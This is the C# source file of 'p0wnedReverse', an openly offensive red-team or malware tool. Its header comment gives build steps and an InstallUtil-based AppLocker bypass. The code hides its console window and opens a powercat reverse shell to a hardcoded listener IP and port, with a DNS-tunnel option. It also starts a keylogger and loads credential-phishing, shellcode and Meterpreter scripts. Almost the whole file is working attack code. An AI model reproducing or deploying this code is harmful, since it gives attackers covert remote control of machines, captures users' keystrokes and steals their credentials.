/*
Author: Cn33liz and Skons
License: BSD 3-Clause

When you need to setup a DNS tunnel, then comment/uncomment LHost, LPort and Domain variable and change PowerCat settings. 
For TCP communication make sure you change the LHost and LPort variable to suit your needs (e.g. Listener IP/Port).
To compile p0wnedReverse you need to import this project within Microsoft Visual Studio or if you don't have access to a Visual Studio installation, you can compile it as follows:

To Compile as x64 binary:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
csc.exe  /unsafe /reference:"C:\p0wnedReverse\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\p0wnedReverse\p0wnedReverseX64.exe /platform:x64 "C:\p0wnedReverse\*.cs"

To Compile as x86 binary:
cd \Windows\Microsoft.NET\Framework\v4.0.30319
csc.exe  /unsafe /reference:"C:\p0wnedReverse\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\p0wnedReverse\p0wnedReverseX86.exe /platform:x86 "H:\p0wnedReverse\*.cs"

Setup your DNSCat2 or Powercat TCP listener and run the executable or...

To run as x64 binary and bypass Applocker:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReverseX64.exe

To run as x86 binary and bypass Applocker:
cd \Windows\Microsoft.NET\Framework\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReverseX86.exe

When started all keystrokes wil be logged into "$env:Temp\KeyLog-*"
To list all keystrokes use the Get-KeyStroke Powershell function within your Reversed shell.   

The Invoke-Meterpreter Powershell function will setup a reversed https meterpreter Shell. This function needs an Listener IP and Port parameter.
Please note that this function only works with the x86 version of p0wnedReverse
*/

using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Text;
using PowerShell = System.Management.Automation.PowerShell;


namespace p0wnedReverse
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction			
        }
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            p0wnedReverseListenerConsole.Main();
        }
    }

    class Proxy
    {
        public static string DetectProxy()
        {
            string url = "http://www.google.com/";
            // Create a new request to the mentioned URL.				
            HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);

            // Obtain the 'Proxy' of the  Default browser.  
            IWebProxy proxy = myWebRequest.Proxy;
            // Print the Proxy Url to the console.

            string ProxyURL = proxy.GetProxy(myWebRequest.RequestUri).ToString();

            if (ProxyURL != url)
            {
                return ProxyURL.TrimEnd('/');
            }
            else
            {
                return null;
            }
        }
    }

    class p0wnedReverseListenerConsole
    {
        private bool shouldExit;

        private int exitCode;

        private MyHost myHost;

        internal Runspace myRunSpace;

        private PowerShell currentPowerShell;

        private object instanceLock = new object();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static string LHost = "192.168.1.250";

        static string LPort = "1337";

        static string PowerCat = "powercat  -c " + LHost + " -p " + LPort + " -ep -t 1000";

        //static string Domain = "myDNSCat2Listener.com";

        //static string PowerCat = "powercat -dns "+Domain+" -ep -rep";

        public p0wnedReverseListenerConsole()
        {

            InitialSessionState state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = new System.Management.Automation.AuthorizationManager("Dummy");

            this.myHost = new MyHost(this);
            this.myRunSpace = RunspaceFactory.CreateRunspace(this.myHost, state);
            this.myRunSpace.Open();

            lock (this.instanceLock)
            {
                this.currentPowerShell = PowerShell.Create();
            }

            try
            {
                this.currentPowerShell.Runspace = this.myRunSpace;

                PSCommand[] profileCommands = p0wnedReverse.HostUtilities.GetProfileCommands("p0wnedReverse");
                foreach (PSCommand command in profileCommands)
                {
                    this.currentPowerShell.Commands = command;
                    this.currentPowerShell.Invoke();
                }
            }
            finally
            {
                lock (this.instanceLock)
                {
                    this.currentPowerShell.Dispose();
                    this.currentPowerShell = null;
                }
            }
        }

        public bool ShouldExit
        {
            get { return this.shouldExit; }
            set { this.shouldExit = value; }
        }

        public int ExitCode
        {
            get { return this.exitCode; }
            set { this.exitCode = value; }
        }

        public static void Main()
        {

            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);

            Parallel.Invoke(() =>
            {
                p0wnedReverseListenerConsole listener = new p0wnedReverseListenerConsole();
                string WebProxy = Proxy.DetectProxy();
                if (WebProxy != null)
                {
                    string UseProxy = "[net.webrequest]::defaultwebproxy = new-object net.webproxy \"" + WebProxy + "\" ;" +
                                      "[net.webrequest]::defaultwebproxy.BypassProxyOnLocal = $True ;" +
                                      "[net.webrequest]::defaultwebproxy.BypassList = ('10.*', '192.168.*');" +
                                      "[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials";
                    listener.Execute(UseProxy);
                }
                listener.Execute(PowerCat);
            },

                () =>
                {
                    KeyLogger.startKeylogger();
                }
            );
        }

        private void executeHelper(string cmd, object input)
        {
            if (String.IsNullOrEmpty(cmd))
            {
                return;
            }

            lock (this.instanceLock)
            {
                this.currentPowerShell = PowerShell.Create();
            }

            try
            {
                this.currentPowerShell.Runspace = this.myRunSpace;

                this.currentPowerShell.AddScript(Resources.PowerCat());
                this.currentPowerShell.AddScript(Resources.Invoke_CredentialsPhish());
                this.currentPowerShell.AddScript(Resources.Get_KeyStrokes());
                this.currentPowerShell.AddScript(Resources.Invoke_Shellcode());
                this.currentPowerShell.AddScript(Resources.Invoke_Meterpreter());

                this.currentPowerShell.AddScript(cmd);
                this.currentPowerShell.AddCommand("out-default");
                this.currentPowerShell.Commands.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);

                if (input != null)
                {
                    this.currentPowerShell.Invoke(new object[] { input });
                }
                else
                {
                    this.currentPowerShell.Invoke();
                }
            }
            finally
            {
                lock (this.instanceLock)
                {
                    this.currentPowerShell.Dispose();
                    this.currentPowerShell = null;
                }
            }
        }

        private void ReportException(Exception e)
        {
            if (e != null)
            {
                object error;
                IContainsErrorRecord icer = e as IContainsErrorRecord;
                if (icer != null)
                {
                    error = icer.ErrorRecord;
                }
                else
                {
                    error = (object)new ErrorRecord(e, "Host.ReportException", ErrorCategory.NotSpecified, null);
                }

                lock (this.instanceLock)
                {
                    this.currentPowerShell = PowerShell.Create();
                }

                this.currentPowerShell.Runspace = this.myRunSpace;

                try
                {
                    this.currentPowerShell.AddScript("$input").AddCommand("out-string");

                    Collection<PSObject> result;
                    PSDataCollection<object> inputCollection = new PSDataCollection<object>();
                    inputCollection.Add(error);
                    inputCollection.Complete();
                    result = this.currentPowerShell.Invoke(inputCollection);

                    if (result.Count > 0)
                    {
                        string str = result[0].BaseObject as string;
                        if (!string.IsNullOrEmpty(str))
                        {
                            this.myHost.UI.WriteErrorLine(str.Substring(0, str.Length - 2));
                        }
                    }
                }
                finally
                {
                    lock (this.instanceLock)
                    {
                        this.currentPowerShell.Dispose();
                        this.currentPowerShell = null;
                    }
                }
            }
        }

        public void Execute(string cmd)
        {
            try
            {
                this.executeHelper(cmd, null);
            }
            catch (RuntimeException rte)
            {
                this.ReportException(rte);
            }
        }

        private void HandleControlC(object sender, ConsoleCancelEventArgs e)
        {
            try
            {
                lock (this.instanceLock)
                {
                    if (this.currentPowerShell != null && this.currentPowerShell.InvocationStateInfo.State == PSInvocationState.Running)
                    {
                        this.currentPowerShell.Stop();
                    }
                }

                e.Cancel = true;
            }
            catch (Exception exception)
            {
                this.myHost.UI.WriteErrorLine(exception.ToString());
            }
        }

    }
}


